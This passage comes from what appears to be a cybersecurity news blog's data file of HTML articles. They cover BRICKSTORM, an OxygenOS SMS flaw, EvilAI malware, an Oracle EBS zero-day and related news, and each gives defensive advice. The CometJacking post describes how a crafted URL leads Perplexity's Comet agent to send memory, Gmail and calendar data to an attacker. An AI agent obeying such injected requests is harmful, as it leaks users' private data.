        The adversary infiltrated top U.S. legal, SaaS, and technology firms and remained undetected for <b>393 days</b>, quietly stealing emails, cloning servers, and moving laterally across environments.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2a3a,#113b53); border-radius:12px; color:#e6f2f8; margin-top:15px;">
      <h3 style="color:#ffd166;">⚙️ How BRICKSTORM Operates</h3><br>
      <p>
        BRICKSTORM is designed for persistence and low-observability. Key tactics observed include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔒 <b>Stealthy persistence</b> via custom service installers and manipulated startup items</li>
        <li>📨 <b>Email harvesting</b> — exfiltrating mailboxes and archived correspondence</li>
        <li>🖥️ <b>Server cloning</b> to reproduce critical VMs/services for deeper lateral movement</li>
        <li>🕵️ <b>Living-off-the-land techniques</b> to avoid signature-based detection</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#062033,#0b2a3d); border-radius:12px; color:#dff3fb; margin-top:15px;">
      <h3 style="color:#7be495;">🔍 Indicators & Detection Challenges</h3><br>
      <p>
        The campaign’s stealth made detection difficult. Observed challenges include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>❗ <b>Low-and-slow data exfiltration</b> that blends into normal traffic</li>
        <li>❗ <b>Custom tooling</b> that lacks public IoCs for signature detection</li>
        <li>❗ Use of <b>legitimate admin utilities</b> and scheduled tasks to mask activity</li>
      </ul>
      <p>
        Analysts recommend focusing on <b>anomalous account activity, unexpected service clones, and unusual outbound connections</b> rather than relying solely on known IoCs.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#12202b,#243b55); border-radius:12px; color:#ecfbff; margin-top:15px;">
      <h3 style="color:#90caf9;">🌍 Impact on Victims</h3><br>
      <p>
        Victims included high-value targets with sensitive client data and intellectual property. Consequences observed:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📧 Compromised attorney-client correspondence and internal communications</li>
        <li>⚙️ Cloned production servers enabling further covert access and sabotage risk</li>
        <li>🔗 Elevated supply-chain risk as SaaS integrations and third-party connectors were abused</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#08121a,#0d2b3b); border-radius:12px; color:#d8f3ff; margin-top:15px;">
      <h3 style="color:#ff9f43;">🛡️ Recommended Immediate Actions</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔁 Rotate & revoke credentials and API tokens for suspected accounts and services</li>
        <li>🔎 Hunt for cloned VM/service artifacts and unexpected disk images</li>
        <li>🧯 Ensure EDR & telemetry capture is enabled for long-term baselining and retrospective analysis</li>
        <li>🔐 Enforce strict least-privilege policies and break overly broad service permissions</li>
        <li>📢 Notify customers & stakeholders if sensitive client data may have been exposed</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:#f3f9fb; border-radius:12px; color:#122233; margin-top:15px;">
      <h3 style="color:#2563eb;">✅ Final Thoughts</h3><br>
      <p>
        BRICKSTORM shows how advanced actors can combine custom backdoors, living-off-the-land techniques, and patient operations to steal high-value data while remaining invisible.  
        The modern defense playbook must include threat hunting, aggressive credential hygiene, and continuous telemetry — because long dwell times cause the most damage.
      </p>
    </section>
  `},{id:"oneplus-cve-2025-10184",title:"⚠️ OnePlus OxygenOS Flaw Exposes MFA SMS Codes",summary:"A high-severity vulnerability (CVSS 8.2) in OxygenOS allows malicious apps to read SMS—including multi-factor authentication codes—without user consent.",date:"2025-09-26",author:"EthicalByte",tags:["OnePlus","Vulnerability","CVE-2025-10184","Android Security","MFA Bypass"],imageKey:"oneplusSMSVuln",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 Critical Flaw in OxygenOS Exposes Your Messages</h3><br>
      <p>
        Security researchers have uncovered a dangerous flaw — <b>CVE-2025-10184</b> — impacting 
        OnePlus devices running <b>OxygenOS 12 and later</b>. The vulnerability (CVSS 8.2) allows 
        <b>any malicious app</b> installed on the device to <b>read SMS messages without permission</b>, 
        including sensitive <b>MFA codes</b>, bank OTPs, and account verification texts.
      </p>
      <p>
        Even more concerning: the issue has remained unpatched since <b>2021</b>, putting millions of users at risk.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#1a1a40); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">📱 What Makes CVE-2025-10184 So Dangerous?</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🚫 No permissions needed — malware can read SMS silently</li>
        <li>🔑 MFA, OTPs, and 2FA codes can be intercepted in real-time</li>
        <li>📤 Attackers can use stolen codes to take over accounts and bypass security</li>
        <li>🕵️ Potential for large-scale credential theft and financial fraud</li>
      </ul>
      <p>
        The vulnerability bypasses Android’s standard permission model, exposing users even if they follow best security practices.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🧪 Current Status & OnePlus Response</h3><br>
      <p>
        OnePlus has acknowledged the report and stated that they are <b>“actively investigating”</b> the vulnerability.  
        However, no official patch or update timeline has been announced as of yet.
      </p>
      <p>
        Users running OxygenOS 12 and newer versions should treat this vulnerability as an active risk.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How to Protect Yourself</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Avoid installing apps from unknown sources or sideloading APKs</li>
        <li>✔️ Use an authenticator app instead of SMS-based 2FA where possible</li>
        <li>✔️ Monitor device permissions and uninstall suspicious apps</li>
        <li>✔️ Apply security patches immediately once available</li>
      </ul>
      <p>
        Until OnePlus issues a fix, <b>your best defense is caution</b>. Treat every app installation as a potential risk.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        CVE-2025-10184 is a stark reminder that <b>even trusted OEM software can introduce massive security gaps</b>.  
        Until OxygenOS receives a patch, treat your SMS inbox as <b>compromised territory</b> — and shift to 
        more secure authentication methods immediately.
      </p>
    </section>
  `},{id:"evilai-malware-campaign-2025",title:"EvilAI Malware Masquerades as AI Tools in Global Attack",summary:"A stealthy new malware campaign, 'EvilAI', is hiding inside legitimate AI and productivity apps — targeting critical sectors worldwide with advanced evasion tactics.",date:"2025-09-30",author:"EthicalByte",tags:["EvilAI","Malware","AI Threats","Cybersecurity","Global Campaign"],imageKey:"evilaiMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 EvilAI: The Malware Hiding in Plain Sight</h3><br>
      <p>
        A new wave of cyberattacks is sweeping across industries — and this time, it's hiding in plain sight.  
        Dubbed <b>"EvilAI"</b>, the campaign involves malicious code embedded inside seemingly legitimate AI and productivity tools, now infecting organizations in <b>India, the U.S., France, Brazil</b>, and beyond.
      </p>
      <p>
        Unlike traditional malware, EvilAI blends perfectly with business workflows, bypassing most security tools and staying undetected for weeks — or even months.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How EvilAI Works</h3><br>
      <p>
        This is not a typical malicious payload. EvilAI leverages legitimate features and developer frameworks to hide its activity:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Uses <b>valid code-signing certificates</b> to appear authentic</li>
        <li>🔐 Encrypts command-and-control (C2) traffic with <b>AES encryption</b></li>
        <li>🧩 Exploits <b>NeutralinoJS</b> to execute payloads inside trusted app processes</li>
        <li>🦠 Deploys modular components for <b>data theft, credential harvesting,</b> and <b>persistence</b></li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🏭 Targeted Industries</h3><br>
      <p>
        EvilAI is targeting sectors where disruption or data theft has maximum impact. Current intelligence points to attacks against:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🏭 <b>Manufacturing</b> – Industrial espionage and supply chain disruptions</li>
        <li>🏥 <b>Healthcare</b> – Patient record theft and ransomware staging</li>
        <li>🏛️ <b>Government</b> – Surveillance and long-term espionage</li>
        <li>💻 <b>Tech Companies</b> – Source code exfiltration and backdoor planting</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚠️ Why It’s So Dangerous</h3><br>
      <p>
        EvilAI is redefining how malware operates. By <b>hiding inside trusted applications</b> and <b>using real developer techniques</b>, it bypasses antivirus engines, EDR systems, and even zero-trust policies.  
        Once inside, it establishes persistence, spreads laterally, and can <b>harvest sensitive data silently</b>.
      </p>
      <p>
        Even seasoned security teams are finding it difficult to distinguish legitimate AI behavior from malicious activity.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">🔍 Final Thoughts</h3><br>
      <p>
        <b>EvilAI</b> proves that the future of cyberattacks is not brute force — it's <b>deception</b>.  
        As AI tools become ubiquitous, security teams must scrutinize even trusted software for hidden threats.  
        The question is no longer “Is this app safe?” but “Do I know <b>what’s running inside</b> it?”
      </p>
    </section>
  `},{id:"uk-bitcoin-seizure-2025",title:"U.K. Police Seize £5.5B in Bitcoin – Largest Crypto Bust Ever",summary:"A Chinese fraudster behind a massive crypto scam laundering 61,000 BTC is caught in London, marking the world’s largest Bitcoin seizure.",date:"2025-10-01",author:"EthicalByte",tags:["Crypto Crime","Bitcoin","UK Police","Money Laundering","Cybercrime"],imageKey:"ukBitcoinBust",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f8f9fa;">
      <h3 style="color:#ff4d6d;">🚨 £5.5 Billion Bitcoin Seized in Record-Breaking Operation</h3><br>
      <p>
        In one of the most staggering cryptocurrency crackdowns ever recorded, 
        <b>U.K. police seized £5.5 billion ($7.4 billion)</b> worth of Bitcoin — marking the <b>largest crypto confiscation in history</b>.  
        The operation targeted a Chinese national accused of orchestrating a massive fraud scheme that victimized more than 
        <b>128,000 people worldwide</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">💰 How the Billion-Dollar Scam Worked</h3><br>
      <p>
        The suspect allegedly <b>laundered stolen funds into 61,000 BTC</b>, cleverly spreading the cryptocurrency across 
        various wallets to evade detection.  
        Using <b>fake identities and shell accounts</b>, the fraudster attempted to remain undetected while transferring 
        illicit gains into digital assets.
      </p>
      <p>
        Investigators revealed that the stolen money came from a sophisticated investment scam targeting users across multiple countries.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🏙️ The Mistake That Got Her Caught</h3><br>
      <p>
        After months of digital laundering, the scammer made a critical error: attempting to <b>purchase high-end property in London</b>.  
        This triggered scrutiny from financial watchdogs, who flagged the transactions, leading to her arrest and the historic seizure.
      </p>
      <p>
        Authorities also discovered <b>multiple fake passports and identities</b> used to mask her real identity.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🌍 Why This Seizure Matters</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>💸 Largest Bitcoin confiscation in global history</li>
        <li>👮‍♂️ Huge blow to international money-laundering networks</li>
        <li>🔎 Proves traditional law enforcement is adapting to digital finance</li>
      </ul>
      <p>
        This case highlights how cybercriminals are evolving — but so are investigators.  
        Even in the decentralized world of crypto, <b>law enforcement is catching up</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        The £5.5 billion Bitcoin seizure is more than a victory for U.K. police — it’s a warning to cybercriminals worldwide.  
        In the age of digital finance, <b>no amount of obfuscation can guarantee anonymity forever</b>.
      </p>
    </section>
  `},{id:"uk-apple-icloud-backdoor-2025",title:"UK Demands Apple Break iCloud Encryption for Britons",summary:"New British order challenges Apple’s encryption policy, forcing potential access to iCloud backups of UK users. Critics say this could weaken global data security.",date:"2025-10-03",author:"EthicalByte",tags:["UK","Apple","iCloud","Encryption Backdoor","Privacy","Tech Policy"],imageKey:"ukAppleBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 U.K. Orders Apple to Break iCloud Encryption</h3><br>
      <p>
        In a dramatic escalation of privacy vs. security tensions, the <b>U.K. government</b> has issued a new order compelling Apple to disable or bypass encryption on iCloud backups of British users.  
        This move comes after Apple earlier disabled its <b>Advanced Data Protection (ADP)</b> for UK users under pressure.  
        The order reportedly covers <b>entire data categories</b> — not just narrow or case-by-case access.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🔐 What’s Being Demanded</h3><br>
      <p>
        The request (widely described as a <b>Technical Capability Notice</b>) isn’t just about disabling ADP — it seeks mechanisms for access across <b>photos, messages, device backups, files, notes</b>, and more that are stored in iCloud.  
        Practically, this would require <b>breaking end-to-end encryption coverage</b> or preventing it from being applied in the first place.
      </p>
      <p>
        Apple has previously argued that any exceptional access creates <b>systemic risk</b> and undermines user trust, even when intended for lawful purposes.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2436,#0f3350); border-radius:12px; color:#e6f2f8; margin-top:15px;">
      <h3 style="color:#7bdff2;">🔎 Quick Primer: What is Advanced Data Protection (ADP)?</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🧩 <b>ADP</b> extends end-to-end encryption to additional iCloud categories (like device backups and Photos), so <b>only you</b> hold the keys.</li>
        <li>🔑 With ADP on, even Apple can’t access the protected content — which is why governments target it.</li>
        <li>🌐 Turning ADP off reverts some data to server-side encryption where Apple holds recovery keys.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Why This Is Dangerous</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛡 Weakening encryption in one jurisdiction creates a <b>global attack surface</b> for criminals and hostile states.</li>
        <li>🔓 Any “lawful access” capability becomes a <b>high-value target</b> for exploitation.</li>
        <li>🌐 Sets a precedent: other countries may push for the <b>same backdoor</b> or broader access.</li>
        <li>🤝 Undermines <b>user trust</b> and the viability of cloud security guarantees.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#12202b,#243b55); border-radius:12px; color:#ecfbff; margin-top:15px;">
      <h3 style="color:#90caf9;">🧭 Possible Paths Apple Could Take</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚖️ <b>Legal pushback</b> (appeals/limited compliance) — arguing that broad backdoors are disproportionate.</li>
        <li>🗺️ <b>Regional feature changes</b> — limiting ADP in certain markets (privacy impact + fragmentation risk).</li>
        <li>🔒 <b>Technical redesigns</b> to reduce Apple’s key custody even further, minimizing compelled access.</li>
        <li>📣 <b>Transparency updates</b> — clarifying what data remains end-to-end encrypted vs server-side encrypted.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a1a,#2b2b2b); border-radius:12px; color:#f1f1f1; margin-top:15px;">
      <h3 style="color:#ffe066;">🛡 What UK Users Can Do Right Now</h3><br>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>🔑 Prefer <b>non-SMS 2FA</b> (authenticator apps or passkeys) for Apple ID and critical accounts.</li>
        <li>🧰 Use <b>end-to-end encrypted apps</b> for chat/files (iMessage E2EE, FaceTime, or third-party E2EE services).</li>
        <li>💽 Keep <b>local encrypted backups</b> (Finder/iTunes with encrypted backup) if ADP isn’t available.</li>
        <li>🗂️ Regularly review <b>iCloud Data Categories</b> and disable sync for data you prefer to keep only on-device.</li>
        <li>🧾 Monitor Apple’s <b>security advisories</b> and enable <b>advanced logging</b> where possible.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🏢 For Enterprises & Regulated Teams</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📜 Update <b>data residency & lawful access</b> language in vendor risk assessments.</li>
        <li>🔐 Enforce <b>device encryption + MDM</b> restrictions on cloud sync for sensitive roles.</li>
        <li>🕵️ Adopt <b>client-side E2EE tooling</b> for legal, medical, and finance workflows.</li>
        <li>🧪 Perform <b>tabletop exercises</b> simulating compelled access and cross-border requests.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#0f1924; border-radius:12px; color:#d7e9ff; margin-top:15px;">
      <h3 style="color:#64dfdf;">🗓️ Context & Timeline (High Level)</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Apple expands <b>ADP</b> to cover more iCloud categories (stronger E2EE).</li>
        <li>🇬🇧 UK pushes for access under <b>Investigatory Powers Act</b> mechanisms.</li>
        <li>🧭 Ongoing back-and-forth: regional feature limits, legal challenges, and new orders.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#222; margin-top:15px;">
      <h3 style="color:#2563eb;">❓FAQ: Common Questions</h3><br>
      <p><b>Q: Does this mean Apple can read my iCloud data now?</b><br>
      <i>A:</i> Not automatically. This is about <b>compelled capability</b>. Whether and how it’s enforced, and which categories are affected, depends on Apple’s response and legal processes.</p>
      <p><b>Q: Is iMessage still end-to-end encrypted?</b><br>
      <i>A:</i> Yes. But <b>message backups</b> in iCloud are the sensitive area if E2EE isn’t applied to backups (that’s what ADP addresses).</p>
      <p><b>Q: What if I already use ADP?</b><br>
      <i>A:</i> Keep it enabled where available. If ADP isn’t offered in your region/account, rely on <b>local encrypted backups</b> and on-device storage for highly sensitive data.</p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        The UK’s push to force Apple into breaking encryption reignites a global debate:  
        Can you demand security from companies <b>without</b> eroding the very foundations of digital privacy?  
        In attempting to protect citizens, governments may create a <b>single point of failure</b> that endangers everyone.
      </p>
    </section>
  `},{id:"cometjacking-insider-threat-2025",title:"CometJacking: One Click Turns Perplexity’s AI into an Insider Threat",summary:"A new exploit called 'CometJacking' abuses Perplexity’s AI agent memory to exfiltrate sensitive data — including Gmail and Calendar — with a single malicious URL, no credentials required.",date:"2025-10-05",author:"EthicalByte",tags:["AI Security","CometJacking","Perplexity","Insider Threat","Data Exfiltration"],imageKey:"cometJackingBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 CometJacking: Turning AI Against You</h3><br>
      <p>
        Security researchers have uncovered a dangerous new exploit called <b>CometJacking</b> — a technique that turns Perplexity’s AI agent, <b>Comet</b>, into a stealthy insider threat with just one malicious link.
      </p>
      <p>
        A single crafted URL can <b>hijack the Comet agent</b>, query its internal memory (<code>collection=...</code>), and <b>exfiltrate sensitive data</b> such as Gmail contents or calendar events <b>without requiring any credentials</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How the Exploit Works</h3><br>
      <p>
        Comet’s internal memory feature is designed to store contextual information from previous sessions to improve responses. However, attackers discovered they could <b>trick the agent into exposing this memory</b> remotely through a simple <b>GET request</b>.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Step 1: Host a malicious URL embedding a query that targets the Comet memory API.</li>
        <li>✅ Step 2: The agent reads and processes the request — <b>no auth or permissions required</b>.</li>
        <li>✅ Step 3: Exfiltrated data is <b>Base64-encoded</b> and sent off-box to an attacker-controlled server.</li>
      </ul>
      <p>
        Because the action occurs within the context of a “trusted” AI agent, <b>traditional security tools fail to flag the activity</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Real-World Impact</h3><br>
      <p>
        CometJacking shows how <b>AI memory itself can become a data leak vector</b>.  
        Sensitive corporate data, emails, cloud tokens, calendar details, and internal conversations — once stored for context — can be quietly siphoned off by malicious actors.
      </p>
      <p>
        The risk is amplified because <b>no credentials, phishing, or malware deployment</b> are required. A single URL click is enough.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🛡️ Defenses and Mitigations</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Restrict agent memory exposure with <b>access control layers</b> and validation checks.</li>
        <li>🚫 Disable or isolate sensitive memory storage in production environments.</li>
        <li>📊 Implement <b>URL sanitization</b> and strict query whitelisting before processing requests.</li>
        <li>🧠 Monitor LLM agents for <b>unexpected outbound traffic</b> or Base64 data streams.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🚀 Final Thoughts</h3><br>
      <p>
        CometJacking proves that <b>AI systems are not just attack targets — they can become attackers themselves</b>.  
        As enterprise adoption of agentic AI accelerates, organizations must treat these systems like any other endpoint: <b>monitor, restrict, and harden them</b>.
      </p>
    </section>
  `},{id:"oracle-ebs-zero-day-cl0p-2025",title:"Oracle Patches CVE-2025-61882: Cl0p Exploits Live Zero-Day in EBS",summary:"Oracle released an emergency patch for a critical 9.8 flaw in E-Business Suite (CVE-2025-61882), which is being actively exploited by Cl0p to steal data. The exploit enables remote code execution without authentication. Apply immediately. ",date:"2025-10-06",author:"EthicalByte",tags:["Oracle","EBS","Zero-Day","Cl0p","RCE","Cybersecurity"],imageKey:"oracleEBSZeroDayBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0a0a0a,#1f1f3a); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d4d;">🚨 Oracle Rushes Patch for Critical EBS Zero-Day</h3><br>
      <p>
        Oracle has issued an emergency security alert for **CVE-2025-61882**, a **critical 9.8 CVSS** vulnerability in E-Business Suite (EBS).  
        This flaw allows unauthenticated remote attackers to execute code on vulnerable instances without needing usernames or passwords. 
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#dfe7f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How It’s Being Exploited</h3><br>
      <p>
        Evidence suggests the Cl0p ransomware/extortion group is actively leveraging this zero-day to steal data from victim EBS environments.   
        In many cases, victims have received extortion emails claiming their data is already compromised.
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ The vulnerability affects EBS versions "12.2.3 through 12.2.14", specifically in the Concurrent Processing / BI Publisher integration.</li>
        <li>✅ Attackers may exploit it by sending crafted HTTP requests to vulnerable endpoints.</li>
        <li>✅ Because it’s unauthenticated, common defenses (like requiring login) are bypassed.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Why This Is Alarming</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Zero-day RCE with **no credentials needed** — extremely dangerous.</li>
        <li>💼 EBS is often central to enterprise operations (finance, HR, supply chain) — breach impact is high.</li>
        <li>💸 The linkage to **Cl0p extortion** means data theft might already be in progress. </li>
        <li>⚠️ Many organizations may already be compromised but unaware.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#d1e0f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🛡 Mitigation & Next Steps</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Immediately apply Oracle’s patch for CVE-2025-61882. </li>
        <li>✅ Compare configured endpoints to known vulnerable paths and apply firewall rules.</li>
        <li>✅ Monitor for anomalous activity, especially suspicious HTTP requests or data exfiltration traffic.</li>
        <li>✅ Review Oracle’s advisory and risk matrices in their patch documentation.</li>
        <li>✅ For organizations that can’t patch immediately, isolate or disable exposed modules if feasible.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        CVE-2025-61882 is not just another zero-day — it’s a critical entry point with direct ties to data theft and extortion.  
        If you run Oracle EBS, your top priority must be patching immediately and validating your environment for any signs of compromise.  
        The time to act is already overdue.
      </p>
    </section>
  `},{id:"weekly-cyber-recap-2025-10-05",title:"Weekly Cyber Recap — Patch Fast. Detect Early. Defend Better.",summary:"This week’s cybersecurity roundup highlights why rapid patching, proactive detection, and future-proof defense strategies are essential against evolving threats — from zero-day exploits to new browser-based attack vectors.",date:"2025-10-07",author:"EthicalByte",tags:["Weekly Recap","Zero-Day","Patch Now","Threat Intelligence","Defense"],imageKey:"weeklyRecapBannerOct2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#eef2ff;">
      <h3 style="color:#60a5fa;">⚡ The Threat Landscape Never Slows Down</h3><br>
      <p>
        Cybersecurity is an ongoing race — one where every second counts. As attackers innovate, organizations must continuously adapt. 
        This week’s major headlines remind us that security isn’t about reacting — it’s about anticipating. From emergency patches for actively exploited 
        vulnerabilities to sophisticated phishing campaigns bypassing MFA, defenders must remain vigilant, proactive, and informed.
      </p>
      <p>
        In this recap, we break down the most important lessons: <b>patch smarter</b> to shrink your attack surface, <b>detect early</b> before intrusions escalate, 
        and <b>prepare for what’s next</b> — because the next breach is already being planned.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#312e81); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#fbbf24;">🛠 Patch Smarter (Not Later)</h3><br>
      <p>
        Patching remains the single most effective defense against known vulnerabilities — yet many organizations still lag behind. This week, we saw critical zero-days 
        in widely used enterprise platforms being actively exploited within hours of disclosure. These incidents underline a key truth: <b>delayed patching equals unnecessary risk.</b>
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚡ <b>Prioritize internet-facing apps</b> and services where exposure risk is highest.</li>
        <li>🛠 Use <b>staged deployment</b> and <b>maintenance windows</b> to minimize operational disruption.</li>
        <li>📊 Leverage <b>threat intelligence</b> to track active exploitation and adjust patching urgency dynamically.</li>
      </ul>
      <p>
        In short, patching should not be a routine chore — it’s a strategic security function. The faster you close the window of exposure, the fewer opportunities attackers have.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2538,#0f3449); border-radius:12px; color:#dbeafe; margin-top:15px;">
      <h3 style="color:#34d399;">👀 Spot Early Risks Before They Escalate</h3><br>
      <p>
        Attackers rarely start with obvious moves. Instead, they leave subtle traces — anomalies that, if detected early, can prevent a full-scale breach. 
        Early detection isn’t just about monitoring; it’s about understanding behavior, context, and intent.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔍 Hunt for <b>anomalous authentication events</b>, unusual log spikes, and unexplained outbound traffic.</li>
        <li>🧩 Monitor <b>browser activity</b> — extensions, token misuse, and session hijacks are becoming common attack vectors.</li>
        <li>📈 Establish <b>baseline activity</b> for SaaS and cloud apps, then trigger alerts for deviations like token reuse or impossible travel events.</li>
      </ul>
      <p>
        The earlier you detect and respond, the less damage attackers can do — turning a potential breach into a contained incident.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f3f4f6; margin-top:15px;">
      <h3 style="color:#ef4444;">🧠 Prepare for What’s Next</h3><br>
      <p>
        Threat actors evolve, and so must your defenses. Beyond reacting to incidents, organizations should build resilience and readiness into their core strategy. 
        Proactive preparation ensures that when — not if — an attack occurs, the impact is minimized, and recovery is swift.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📚 Conduct regular <b>tabletop exercises</b> focused on real-world attack scenarios like ransomware or supply-chain compromise.</li>
        <li>🧠 Invest in <b>endpoint detection & response (EDR)</b> and <b>DNS egress filtering</b> to stop attackers mid-operation.</li>
